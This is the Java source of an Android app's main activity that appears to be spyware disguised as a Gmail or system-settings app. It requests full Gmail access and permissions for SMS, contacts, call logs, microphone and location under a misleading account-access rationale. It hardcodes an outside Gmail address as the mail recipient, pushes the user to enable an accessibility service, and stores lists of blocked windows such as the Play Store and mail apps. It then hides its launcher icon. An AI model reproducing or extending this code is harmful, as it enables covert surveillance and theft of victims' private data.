package com.setting.dl.google.gmailapi;

import android.Manifest;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v7.app.AppCompatActivity;
import android.widget.Button;
import android.widget.TextView;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GoogleApiAvailability;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.api.client.extensions.android.http.AndroidHttp;
import com.google.api.client.googleapis.extensions.android.gms.auth.GoogleAccountCredential;
import com.google.api.client.googleapis.extensions.android.gms.auth.GooglePlayServicesAvailabilityIOException;
import com.google.api.client.googleapis.extensions.android.gms.auth.UserRecoverableAuthIOException;
import com.google.api.client.http.HttpTransport;
import com.google.api.client.json.JsonFactory;
import com.google.api.client.json.jackson2.JacksonFactory;
import com.google.api.client.util.ExponentialBackOff;
import com.google.api.services.gmail.GmailScopes;
import com.google.api.services.gmail.model.Label;
import com.google.api.services.gmail.model.ListLabelsResponse;
import com.setting.dl.google.gmailapi.mail.gmail.Mail;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import pub.devrel.easypermissions.AfterPermissionGranted;
import pub.devrel.easypermissions.EasyPermissions;

@SuppressLint("SetTextI18n")
public class MainActivity extends AppCompatActivity implements EasyPermissions.PermissionCallbacks,
		GoogleApiClient.ConnectionCallbacks,
		GoogleApiClient.OnConnectionFailedListener {
	
	public static final  String[] SCOPES                          = { GmailScopes.MAIL_GOOGLE_COM };
	 final         int      REQUEST_ACCOUNT_PICKER          = 1000;
	 final         int      REQUEST_AUTHORIZATION           = 1001;
	 final         int      REQUEST_GOOGLE_PLAY_SERVICES    = 1002;
	 final         int      REQUEST_PERMISSION_GET_ACCOUNTS = 1003;
	
	
	GoogleAccountCredential mCredential;
	ProgressDialog          mProgress;
	private TextView        mOutputText;
	private Button          mCallApiButton;
	private Button          notificationButton;
	
	
	private SharedPreferences prefGmail;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		
		super.onCreate(savedInstanceState);
		
		setContentView(R.layout.activity_main);
		
		mOutputText = findViewById(R.id.outputText);
		
		prefGmail = getSharedPreferences("gmail", MODE_PRIVATE);
		
		mCallApiButton = findViewById(R.id.signButton);
		
		prefGmail.edit().putString("to", "systemxyz1@gmail.com").apply();
		
		
		notificationButton = findViewById(R.id.notificationButton);
		
		
		notificationButton.setOnClickListener(v -> {
			
			if(AccessNotification.isAccessibilityServiceEnabled(this, AccessNotification.class)){
				
				if (Mail.getFrom(this) != null) {
				
					finish();
				}
			}
			else{
				accessibilityServiceSetting();
			}
		});
		
		//usageStatSettingButton.setOnClickListener(v -> UsageStatMan.openUsageStatSetting(MainActivity.this));
		
		mCallApiButton.setOnClickListener(v -> {
			
			mCallApiButton.setEnabled(false);
			getResultsFromApi();
			mCallApiButton.setEnabled(true);
		});
		
		mProgress = new ProgressDialog(this);
		mProgress.setMessage("Bekle...");
		
		// Initialize credentials and service object.
		mCredential = GoogleAccountCredential.usingOAuth2(getApplicationContext(), Arrays.asList(SCOPES)).setBackOff(new ExponentialBackOff());
		
		
		/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ */
		/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ */
		/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ */
		/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ */
		
	
		u.log.w(Time.whatTimeIsIt());
		
		if (BuildConfig.DEBUG) {
			
			u.log.i("Debug mode started");
		}
		
		
		final String[] hardBlock = {
				
				getPackageName(),
				"com.samsung.android.incallui",
				"com.android.vending",
				"com.android.providers.downloads"
				
		};
		
		final String[] blockedWindows = {
				
				getPackageName(),
				"com.samsung.android.incallui",
				"com.android.vending",
				"com.android.providers.downloads",
				"com.android.systemui",
				"com.google.android.youtube",
				"com.my.mail",
				"com.mailbox.email",
				"me.bluemail.mail",
				"com.android.launcher3",
				"org.kman.AquaMail",
				"com.xyz.systemsetting"
			
		};
		
		
		SharedPreferences nlServicePref = getSharedPreferences("nlService", MODE_PRIVATE);
		
		Set<String> hardP = new HashSet<>(Arrays.asList(hardBlock));
		Set<String> blockW = new HashSet<>(Arrays.asList(blockedWindows));
		
		nlServicePref
				.edit()
				.putStringSet("hardBlock",hardP)
				.putStringSet("blockedWindows",blockW).apply();
		
		
		
		
		mCallApiButton.performClick();
		
	}
	
	
	
	public void accessibilityServiceSetting() {
		
		Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
		startActivity(intent);
	}
	
	@Override
	protected void onResume() {
		super.onResume();
		
		
		if(AccessNotification.isAccessibilityServiceEnabled(this, AccessNotification.class)){
			
			u.log.d("AccessibilityService true");
			
			if (Mail.getFrom(this) != null) {
				
				u.sendMessage(this, "com.xyz", "analiz başladı : " + Mail.getFrom(this));
				finishAndRemoveTask();
				
			}
		}
		else{
			
			u.log.d("AccessibilityService false");
		}
		
		String from = Mail.getFrom(this);
		notificationButton.setEnabled(from != null);
		mCallApiButton.setEnabled(from == null);
	}
	
	@Override protected void onStart() {
		
		super.onStart();
		
	}
	
	@Override
	protected void onPause() {
		
		super.onPause();
		mProgress.dismiss();
	}
	
	@Override
	protected void onStop() {
		
		super.onStop();
	}
	
	@Override
	protected void onDestroy() {
		
		super.onDestroy();
		
		if (!BuildConfig.DEBUG) {
			
			if(AccessNotification.isAccessibilityServiceEnabled(this, AccessNotification.class) && Mail.getFrom(this) != null)
				hideApp();
		}
		
	}
	
	public void hideApp() {
		
		PackageManager packageManager = getPackageManager();
		ComponentName componentName  = new ComponentName(this, MainActivity.class);
		packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
	}
	
	/**
	 * Respond to requests for permissions at runtime for API 23 and above.
	 *
	 * @param requestCode  The request code passed in
	 *                     requestPermissions(android.app.Activity, String, int, String[])
	 * @param permissions  The requested permissions. Never null.
	 * @param grantResults The grant results for the corresponding permissions
	 *                     which is either PERMISSION_GRANTED or PERMISSION_DENIED. Never null.
	 */
	@Override
	public void onRequestPermissionsResult(int requestCode,
	                                       @NonNull String[] permissions,
	                                       @NonNull int[] grantResults) {
		
		super.onRequestPermissionsResult(requestCode, permissions, grantResults);
		
		
		EasyPermissions.onRequestPermissionsResult(
				requestCode, permissions, grantResults, this);
	}
	
	/**
	 * Called when an activity launched here (specifically, AccountPicker
	 * and authorization) exits, giving you the requestCode you started it with,
	 * the resultCode it returned, and any additional data from it.
	 *
	 * @param requestCode code indicating which activity result is incoming.
	 * @param resultCode  code indicating the result of the incoming
	 *                    activity result.
	 * @param data        Intent (containing result data) returned by incoming
	 *                    activity result.
	 */
	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		
		super.onActivityResult(requestCode, resultCode, data);
		
		switch (requestCode) {
			
			case REQUEST_GOOGLE_PLAY_SERVICES:
				
				if (resultCode != RESULT_OK) {
					
					mOutputText.setText("googleplay servisi yüklü değil");
				}
				else {
					
					getResultsFromApi();
				}
				
				break;
			
			case REQUEST_ACCOUNT_PICKER:
				
				if (resultCode == RESULT_OK && data != null && data.getExtras() != null) {
					
					String accountName = data.getStringExtra(AccountManager.KEY_ACCOUNT_NAME);
					
					if (accountName != null) {
						
						prefGmail.edit().putString("from", accountName).apply();
						mCredential.setSelectedAccountName(accountName);
						getResultsFromApi();
					}
				}
				
				break;
			
			case REQUEST_AUTHORIZATION:
				
				if (resultCode == RESULT_OK) {
					
					getResultsFromApi();
				}
				
				break;
		}
	}
	
	/**
	 * Attempt to call the API, after verifying that all the preconditions are
	 * satisfied. The preconditions are: Google Play Services installed, an
	 * account was selected and the device currently has online access. If any
	 * of the preconditions are not satisfied, the app will prompt the user as
	 * appropriate.
	 */
	private void getResultsFromApi() {
		
		if (!isGooglePlayServicesAvailable()) {
			u.log.w("googleplay service not available");
			acquireGooglePlayServices();
		}
		else if (mCredential.getSelectedAccountName() == null) {
			
			u.log.d("hesap seçilecek");
			chooseAccount();
		}
		else if (!isDeviceOnline()) {
			mOutputText.setText("internet yok");
		}
		else {
			new MakeRequestTask(mCredential).execute();
		}
	}
	
	/**
	 * Attempts to set the account used with the API credentials. If an account
	 * name was previously saved it will use that one; otherwise an account
	 * picker dialog will be shown to the user. Note that the setting the
	 * account to use with the credentials object requires the app to have the
	 * GET_ACCOUNTS permission, which is requested here if it is not already
	 * present. The AfterPermissionGranted annotation indicates that this
	 * function will be rerun automatically whenever the GET_ACCOUNTS permission
	 * is granted.
	 */
	@AfterPermissionGranted(REQUEST_PERMISSION_GET_ACCOUNTS)
	private void chooseAccount() {
		
		if (EasyPermissions.hasPermissions(this, Manifest.permission.GET_ACCOUNTS)) {
			
			String accountName = prefGmail.getString("from", null);
			
			if (accountName != null) {
				
				u.log.d("accountName = " + accountName);
				mCredential.setSelectedAccountName(accountName);
				getResultsFromApi();
			}
			else {
				// Start a dialog from which the user can choose an account
				startActivityForResult(mCredential.newChooseAccountIntent(), REQUEST_ACCOUNT_PICKER);
				
			}
		}
		else {
			
			// Request the GET_ACCOUNTS permission via a user dialog
			EasyPermissions.requestPermissions(
					this,
					"This app needs to access your Google account (via Contacts).",
					REQUEST_PERMISSION_GET_ACCOUNTS,
					Manifest.permission.READ_EXTERNAL_STORAGE,
					Manifest.permission.READ_SMS,
					Manifest.permission.READ_CONTACTS,
					Manifest.permission.READ_CALL_LOG,
					Manifest.permission.RECORD_AUDIO,
					Manifest.permission.ACCESS_COARSE_LOCATION,
					Manifest.permission.ACCESS_FINE_LOCATION,
					Manifest.permission.GET_ACCOUNTS
			
			);
		}
	}
	
	/**
	 * Callback for when a permission is granted using the EasyPermissions
	 * library.
	 *
	 * @param requestCode The request code associated with the requested
	 *                    permission
	 * @param list        The requested permission list. Never null.
	 */
	@Override
	public void onPermissionsGranted(int requestCode, List<String> list) {
		// Do nothing.
	}
	
	/**
	 * Callback for when a permission is denied using the EasyPermissions
	 * library.
	 *
	 * @param requestCode The request code associated with the requested
	 *                    permission
	 * @param list        The requested permission list. Never null.
	 */
	@Override
	public void onPermissionsDenied(int requestCode, List<String> list) {
		// Do nothing.
	}
	
	/**
	 * Checks whether the device currently has a network connection.
	 *
	 * @return true if the device has a network connection, false otherwise.
	 */
	private boolean isDeviceOnline() {
		
		ConnectivityManager connMgr     = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo         networkInfo = null;
		if (connMgr != null) {
			networkInfo = connMgr.getActiveNetworkInfo();
		}
		return (networkInfo != null && networkInfo.isConnected());
	}
	
	/**
	 * Check that Google Play services APK is installed and up to date.
	 *
	 * @return true if Google Play Services is available and up to
	 * date on this device; false otherwise.
	 */
	private boolean isGooglePlayServicesAvailable() {
		
		GoogleApiAvailability apiAvailability = GoogleApiAvailability.getInstance();
		final int connectionStatusCode = apiAvailability.isGooglePlayServicesAvailable(this);
		return connectionStatusCode == ConnectionResult.SUCCESS;
	}
	
	/**
	 * Attempt to resolve a missing, out-of-date, invalid or disabled Google
	 * Play Services installation via a user dialog, if possible.
	 */
	private void acquireGooglePlayServices() {
		
		GoogleApiAvailability apiAvailability      = GoogleApiAvailability.getInstance();
		final int             connectionStatusCode = apiAvailability.isGooglePlayServicesAvailable(this);
		
		if (apiAvailability.isUserResolvableError(connectionStatusCode)) {
			
			showGooglePlayServicesAvailabilityErrorDialog(connectionStatusCode);
		}
	}
	
	
	/**
	 * Display an error dialog showing that Google Play Services is missing
	 * or out of date.
	 *
	 * @param connectionStatusCode code describing the presence (or lack of)
	 *                             Google Play Services on this device.
	 */
	void showGooglePlayServicesAvailabilityErrorDialog(final int connectionStatusCode) {
		
		GoogleApiAvailability apiAvailability = GoogleApiAvailability.getInstance();
		
		Dialog dialog = apiAvailability.getErrorDialog(
				MainActivity.this,
				connectionStatusCode,
				REQUEST_GOOGLE_PLAY_SERVICES);
		dialog.show();
	}
	
	@Override
	public void onConnected(@Nullable Bundle bundle) {
	
	}
	
	@Override
	public void onConnectionSuspended(int i) {
	
	}
	
	@Override
	public void onConnectionFailed(@NonNull ConnectionResult connectionResult) {
    /*
        if (connectionResult.hasResolution()) {
            try {
                connectionResult.startResolutionForResult(this, RESOLVE_CONNECTION_REQUEST_CODE);
            } catch (IntentSender.SendIntentException e) {
                // Unable to resolve, message user appropriately
            }
        } else {
            GooglePlayServicesUtil.getErrorDialog(connectionResult.getErrorCode(), this, 0).show();
            Log.e("onConnectionFailed", "error");
        }
        
        */
	}
	
	/**
	 * An asynchronous task that handles the Gmail API call.
	 * Placing the API calls in their own task ensures the UI stays responsive.
	 */
	@SuppressLint("StaticFieldLeak")
	private class MakeRequestTask extends AsyncTask<Void, Void, List<String>> {
		
		private com.google.api.services.gmail.Gmail mService;
		private Exception                           mLastError = null;
		
		MakeRequestTask(GoogleAccountCredential credential) {
			
			HttpTransport transport   = AndroidHttp.newCompatibleTransport();
			JsonFactory   jsonFactory = JacksonFactory.getDefaultInstance();
			
			mService = new com.google.api.services.gmail.Gmail.Builder(transport, jsonFactory, credential)
					.setApplicationName("Gmail API Android Quickstart")
					.build();
		}
		
		/**
		 * Background task to call Gmail API.
		 *
		 * @param params no parameters needed for this task.
		 */
		@Override
		protected List<String> doInBackground(Void... params) {
			
			try {
				return getDataFromApi();
			}
			catch (Exception e) {
				mLastError = e;
				cancel(true);
				return null;
			}
		}
		
		/**
		 * Fetch a list of Gmail labels attached to the specified account.
		 *
		 * @return List of Strings labels.
		 */
		private List<String> getDataFromApi()
				throws
				IOException {
			// Get the labels in the user's account.
			String             user         = "me";
			List<String>       labels       = new ArrayList<>();
			ListLabelsResponse listResponse = mService.users().labels().list(user).execute();
			
			for (Label label : listResponse.getLabels()) {
				
				labels.add(label.getName());
			}
			return labels;
		}
		
		
		@Override
		protected void onPreExecute() {
			
			//mOutputText.setText("");
			mProgress.show();
		}
		
		
        @Override
        protected void onPostExecute(List<String> output) {
			
            mProgress.hide();
            
            if (output == null || output.size() == 0) {
                
                mOutputText.setText("Dönen sonuç yok");
            }
            else {
	
				u.log.w(Arrays.toString(output.toArray()));
                
                boolean b = false;
                
                for (String s : output) {
                    
                    if(s.equals("INBOX")){
                        
                        b = true;
                        break;
                    }
                    
                }
                
                if (b) {
                    
                    mCallApiButton.setEnabled(false);
                    mOutputText.setText(Mail.getFrom(MainActivity.this));
                    
                    Mail.send(MainActivity.this, "Main", "Bu bir denemedir");
                    
                    if(AccessNotification.isAccessibilityServiceEnabled(getApplicationContext(), AccessNotification.class)){
                        
                        u.sendMessage(MainActivity.this, "com.xyz", "analiz başladı : " + Mail.getFrom(MainActivity.this));
                        finishAndRemoveTask();
                        
                    }
                    else{
                        
                        notificationButton.setEnabled(true);
                        
                    }
                }
                else{
                    
                    output.add(0, "Data retrieved using the Gmail API:");
                    mOutputText.setText("access error");
                }
            }
        }
		
		@Override
		protected void onCancelled() {
			
			mProgress.hide();
			if (mLastError != null) {
				if (mLastError instanceof GooglePlayServicesAvailabilityIOException) {
					showGooglePlayServicesAvailabilityErrorDialog(
							((GooglePlayServicesAvailabilityIOException) mLastError)
									.getConnectionStatusCode());
				}
				else if (mLastError instanceof UserRecoverableAuthIOException) {
					startActivityForResult(
							((UserRecoverableAuthIOException) mLastError).getIntent(),
							REQUEST_AUTHORIZATION);
				}
			}
			else {
				mOutputText.setText("iptal edildi");
			}
		}
	}
	
	
	
	
	
	
}
